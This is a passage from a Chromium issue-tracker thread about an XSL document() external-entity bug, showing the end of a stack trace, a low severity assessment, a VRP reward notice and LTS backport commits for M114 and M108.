63	chrome.dll	content::ContentMainRunnerImpl::Run + 0x377, D:\chromium\src\content\app\content_main_runner_impl.cc(1118)	0x7fff36128e47	D:\chromium\src\out\Release\chrome.dll
64	chrome.dll	content::ContentMain + 0x4fc, D:\chromium\src\content\app\content_main.cc(342)	0x7fff3612856c	D:\chromium\src\out\Release\chrome.dll
65	chrome.dll	ChromeMain + 0x27d, D:\chromium\src\chrome\app\chrome_main.cc(187)	0x7fff3612619d	D:\chromium\src\out\Release\chrome.dll
66	chromb.exe	MainDllLoader::Launch + 0x348, D:\chromium\src\chrome\app\main_dll_loader_win.cc(164)	0x7ff621c81328	D:\chromium\src\out\Release\chromb.exe
67	chromb.exe	wWinMain + 0x6a1, D:\chromium\src\chrome\app\chrome_exe_main_win.cc(389)	0x7ff621c804c1	D:\chromium\src\out\Release\chromb.exe
68	chromb.exe	__scrt_common_main_seh + 0x106, D:\a\_work\1\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl(281)	0x7ff621d59eb2	D:\chromium\src\out\Release\chromb.exe
69	KERNEL32.DLL	BaseThreadInitThunk + 0x14	0x7fffe0107614	C:\WINDOWS\System32\KERNEL32.DLL
70	ntdll.dll	RtlUserThreadStart + 0x21	0x7fffe0d426b1	C:\WINDOWS\SYSTEM32\ntdll.dll
```

And ACCESS DENIED by the sandbox.

It's possible that some files are allowed on other platforms but these are likely to be specific exceptions for certain libraries - not a general file disclosure.

As such this bug is likely Severity=Low or even None. It might however be important for embedders using different sandboxing to take these changes.

### am...@google.com (2023-08-03)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2023-08-03)

Congratulations, Igor! The Chrome VRP Panel has decided to award you $3,000 for this report. A member of our finance team will be in touch with you soon to arrange payment. Thank you for your efforts and reporting this issue to us -- nice work! 

### am...@google.com (2023-08-05)

[Empty comment from Monorail migration]

### na...@google.com (2023-08-08)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-08-11)

[Empty comment from Monorail migration]

### am...@google.com (2023-08-15)

[Empty comment from Monorail migration]

### pg...@google.com (2023-08-15)

[Empty comment from Monorail migration]

### gm...@google.com (2023-08-28)

@rzanoni just checking that your assessment in https://crbug.com/chromium/1458911#c35 is for 108. If so please send a merge request/ questionnaire for 114. I will approve for 108 in a couple of days

### rz...@google.com (2023-08-29)

[Empty comment from Monorail migration]

### rz...@google.com (2023-08-30)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-30)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)



For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### rz...@google.com (2023-08-30)

1. Just https://crrev.com/c/4822244
2. Low, no conflicts
3. 116
4. Yes

### gm...@google.com (2023-08-31)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2023-08-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/a0b312fa03d42ec85ced37cafd106d31359dd963

commit a0b312fa03d42ec85ced37cafd106d31359dd963
Author: Daniel Cheng <dcheng@chromium.org>
Date: Thu Aug 31 08:56:56 2023

[M114-LTS] Set current document when processing xsl document().

This is needed to look up various properties of the owning document when
parsing XML in Blink.

(cherry picked from commit 1f798a8525fb85be1a4aa526bdb8420f8cdced0e)

Bug: 1458911
Change-Id: If97b6a0a3364c526539c5b7bc0fd40dc01fd1731
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4691202
Commit-Queue: Daniel Cheng <dcheng@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1171307}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4822244
Owners-Override: Achuith Bhandarkar <achuith@chromium.org>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/5735@{#1583}
Cr-Branched-From: 2f562e4ddbaf79a3f3cb338b4d1bd4398d49eb67-refs/heads/main@{#1135570}

[modify] https://crrev.com/a0b312fa03d42ec85ced37cafd106d31359dd963/third_party/blink/renderer/core/xml/xslt_processor_libxslt.cc
[add] https://crrev.com/a0b312fa03d42ec85ced37cafd106d31359dd963/third_party/blink/web_tests/http/tests/xsl/resources/xsl-using-document-with-external-entity-target-document.xml
[add] https://crrev.com/a0b312fa03d42ec85ced37cafd106d31359dd963/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity.xml
[add] https://crrev.com/a0b312fa03d42ec85ced37cafd106d31359dd963/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity-expected.txt


### gi...@appspot.gserviceaccount.com (2023-08-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/744577ce6fa76a7470b9fd0f9dbde7449fa37838

commit 744577ce6fa76a7470b9fd0f9dbde7449fa37838
Author: Daniel Cheng <dcheng@chromium.org>
Date: Thu Aug 31 10:35:13 2023

[M108-LTS] Set current document when processing xsl document().

This is needed to look up various properties of the owning document when
parsing XML in Blink.

(cherry picked from commit 1f798a8525fb85be1a4aa526bdb8420f8cdced0e)

Bug: 1458911
Change-Id: If97b6a0a3364c526539c5b7bc0fd40dc01fd1731
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4691202
Commit-Queue: Daniel Cheng <dcheng@chromium.org>
Cr-Original-Commit-Position: refs/heads/main@{#1171307}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/4738013
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Owners-Override: Achuith Bhandarkar <achuith@chromium.org>
Reviewed-by: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/5359@{#1507}
Cr-Branched-From: 27d3765d341b09369006d030f83f582a29eb57ae-refs/heads/main@{#1058933}

[add] https://crrev.com/744577ce6fa76a7470b9fd0f9dbde7449fa37838/third_party/blink/web_tests/http/tests/xsl/resources/xsl-using-document-with-external-entity-target-document.xml
[modify] https://crrev.com/744577ce6fa76a7470b9fd0f9dbde7449fa37838/third_party/blink/renderer/core/xml/xslt_processor_libxslt.cc
[add] https://crrev.com/744577ce6fa76a7470b9fd0f9dbde7449fa37838/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity.xml
[add] https://crrev.com/744577ce6fa76a7470b9fd0f9dbde7449fa37838/third_party/blink/web_tests/http/tests/xsl/xsl-using-document-with-external-entity-expected.txt


### rz...@google.com (2023-08-31)

[Empty comment from Monorail migration]

### rz...@google.com (2023-08-31)

[Empty comment from Monorail migration]

### [Deleted User] (2023-10-24)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1458911?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40066577)*
